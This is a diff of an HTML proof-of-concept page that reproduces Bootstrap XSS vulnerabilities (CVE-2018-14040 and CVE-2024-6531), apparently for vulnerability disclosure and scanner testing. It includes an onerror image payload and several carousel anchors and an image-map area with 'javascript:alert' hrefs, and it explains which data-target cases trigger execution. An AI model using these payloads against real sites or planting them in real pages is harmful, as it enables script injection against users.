@@ -8,7 +8,9 @@
   </head>
   <body>
     <h1>POC SCA - Bootstrap 3.3.7 CDN</h1>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
+    ></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
     <div class="mb-5">
         <a href="." class="btn btn-primary btn-lg px-4">Local files</a>
@@ -16,9 +18,271 @@
     <br>
     <a id="x" data-toggle="collapse" href="#x" data-parent="<img src=x onerror=alert(1) />">XSS CVE-2018-14040 Bootstrap < 3.4.0 || < 4.1.2</a>
     <br>
-    <div id="myCarousel" class="carousel"></div>
-    <a href="javascript:alert('XSS CVE-2024-6531 - bootstrap >=4.0.0 &lt;5.0.0-beta1')" data-slide="prev">
-      Previous Slide
-    </a>
+    <section class="vulnerability-info-section">
+      <h2>Vulnerability Information</h2>
+      <div class="container">
+        <dl class="xdl-horizontal row">
+          <dt class="col-12 col-sm-3">Type:</dt>
+          <dd class="col-12 col-sm-9">
+            <a
+              href="https://owasp.org/www-community/attacks/xss/"
+              target="_blank"
+              >XSS</a
+            >
+            from improper sanitization of Carousel component
+            <code>href</code> data for anchor navigation elements.
+          </dd>
+
+          <dt class="col-12 col-sm-3">Affected versions:</dt>
+          <dd class="col-12 col-sm-9">&gt;=4.0.0 &lt;=4.6.2</dd>
+
+          <dt class="col-12 col-sm-3">CVE:</dt>
+          <dd class="col-12 col-sm-9">
+            <a href="https://www.cve.org/CVERecord?id=CVE-2024-6531"
+              >CVE-2024-6531</a
+            >
+          </dd>
+
+          <dt class="col-12 col-sm-3">Fixed in version:</dt>
+          <dd class="col-12 col-sm-9">
+            <a
+              href="https://www.herodevs.com/support/nes-bootstrap"
+              target="_blank"
+              >Bootstrap NES</a
+            >
+            v4.6.4
+          </dd>
+
+          <dt class="col-12 col-sm-3">Description:</dt>
+          <dd class="col-12 col-sm-9">
+            <p>
+              A carousel navigation element's
+              <code>href</code> attribute value is not subject to adequate
+              content sanitization. As a result, proper restrictions are not
+              applied to the data that can be passed which can lead to potential
+              <a
+                href="https://owasp.org/www-community/attacks/xss/"
+                target="_blank"
+                >XSS</a
+              >
+              vulnerabilities. This happens in the abscence of a valid
+              <code>data-target</code> that references an actual carousel
+              element.
+            </p>
+            <p>
+              Additionally, the carousel component doesn't stop the event's
+              default action and therefore the element's
+              <code>href</code> is executed due to lack of
+              <code>preventDefault()</code> method being invoked.
+            </p>
+          </dd>
+        </dl>
+      </div>
+    </section>
+
+    <section class="repro-instructions-section">
+      <h2>Reproduction Instructions</h2>
+      <p>
+        The examples below demonstrate the issue by attempting to load
+        executable javascript via Bootstrap Carousel navigation
+        <code>&lt;a href=""></code> attributes like
+        <code>javascript:alert()</code>.
+      </p>
+      <p>
+        <b>Steps:</b>
+      </p>
+
+      <ol>
+        <li>
+          <p>
+            Create a
+            <a
+              href="https://getbootstrap.com/docs/4.6/components/carousel/"
+              target="_blank"
+              >Bootstrap 4 Carousel</a
+            >.
+          </p>
+          <blockquote>
+            Reference the table below as well as this
+            <code>index.html</code> content.
+          </blockquote>
+        </li>
+        <li>
+          Edit the <code>href</code> for a navigation anchor and add in XSS
+          content.
+          <br />
+          <pre>
+              &lt;a href="javascript:alert('XSS Success')" data-slide="next">Next&lt;/a>
+          </pre>
+          <p>Note: do not include a <code>data-target</code> attribute.</p>
+        </li>
+        <li>Click the 'Next' link and observe the alert firing.</li>
+      </ol>
+    </section>
+
+    <section class="repro-content-section" ng-app="app">
+      <h2>Reproduction</h2>
+
+      <h3>Normal Example</h3>
+
+      <div class="carousel-container">
+        <div
+          id="normalCarouselExample"
+          class="carousel slide"
+          data-ride="carousel"
+        >
+          <div class="carousel-inner">
+            <div class="carousel-item active">
+              <img
+                src="https://placeholder.pics/svg/400x200/DEDEDE/555555/Slide%201"
+              />
+            </div>
+            <div class="carousel-item">
+              <img
+                src="https://placeholder.pics/svg/400x200/0000ff/fff/Slide%202"
+              />
+            </div>
+            <div class="carousel-item">
+              <img
+                src="https://placeholder.pics/svg/400x200/ae4d08/fff/Slide%203"
+              />
+            </div>
+          </div>
+        </div>
+
+        <a
+          class="valid"
+          href="#normalCarouselExample"
+          role="button"
+          data-slide="prev"
+          >Previous
+        </a>
+        <a
+          class="valid"
+          href="#normalCarouselExample"
+          role="button"
+          data-slide="next"
+          style="float: right"
+        >
+          Next
+        </a>
+      </div>
+
+      <hr />
+
+      <h3>Vulnerable Examples</h3>
+
+      <div class="carousel-container">
+        <div id="carouselExample" class="carousel slide" data-ride="carousel">
+          <div class="carousel-inner">
+            <div class="carousel-item active">
+              <img
+                src="https://placeholder.pics/svg/400x200/DEDEDE/555555/Slide%201"
+              />
+            </div>
+            <div class="carousel-item">
+              <img
+                src="https://placeholder.pics/svg/400x200/0000ff/fff/Slide%202"
+              />
+            </div>
+            <div class="carousel-item">
+              <img
+                src="https://placeholder.pics/svg/400x200/ae4d08/fff/Slide%203"
+              />
+            </div>
+          </div>
+        </div>
+
+        <h4>Vulnerable Anchor Tests</h4>
+
+        <div class="carousel-controls">
+          <span class="href">href + XSS;</span>
+          <span class="data-target">no data-target;</span>
+          <a
+            class="next"
+            href="javascript:alert('XSS Success')"
+            role="button"
+            data-slide="next"
+            title="XSS executes"
+          >
+            <span class="xss">Next</span>
+          </a>
+        </div>
+        <div class="carousel-controls">
+          <span class="href">href + XSS;</span>
+          <span class="data-target">valid data-target;</span>
+
+          <a
+            class="next valid"
+            href="javascript:alert('XSS Success')"
+            data-target="#carouselExample"
+            role="button"
+            data-slide="next"
+            title="XSS ignored"
+          >
+            <span>Next</span>
+          </a>
+        </div>
+        <div class="carousel-controls">
+          <span class="href">href + XSS;</span>
+          <span class="data-target">invalid data-target;</span>
+          <a
+            class="next"
+            href="javascript:alert('XSS Success')"
+            data-target="#not-valid-target"
+            role="button"
+            data-slide="next"
+            title="XSS executes"
+          >
+            <span class="xss">Next</span>
+          </a>
+        </div>
+        <div class="carousel-controls">
+          <span class="href">href + XSS;</span>
+          <span class="data-target">valid, non-carousel data-target;</span>
+
+          <a
+            class="next"
+            href="javascript:alert('XSS Success')"
+            data-target="#some-random-div"
+            role="button"
+            data-slide="next"
+            title="XSS executes"
+          >
+            <span class="xss">Next</span>
+          </a>
+        </div>
+        <div class="carousel-controls">
+          <span class="href">href</span>
+          <span class="data-target">data-target + XSS;</span>
+          <a
+            class="next"
+            href="#exampleCarousel"
+            data-target="javascript:alert(4)"
+            role="button"
+            data-slide="next"
+            title="XSS fails"
+          >
+            <span>Next</span> (invalid)
+          </a>
+        </div>
+
+        <h4>Vulnerable Image Map</h4>
+        <img
+          src="https://placeholder.pics/svg/200x100/064306/fff/Click%20Me"
+          usemap="#examplemap"
+        />
+        <div>
+          <map name="examplemap">
+            <area
+              shape="rect"
+              coords="0,0,270,350"
+              href="javascript:alert('XSS Success')"
+              data-slide="prev"
+            />
+          </map>
+        </div>
+      </div>
+    </section>
   </body>
 </html>
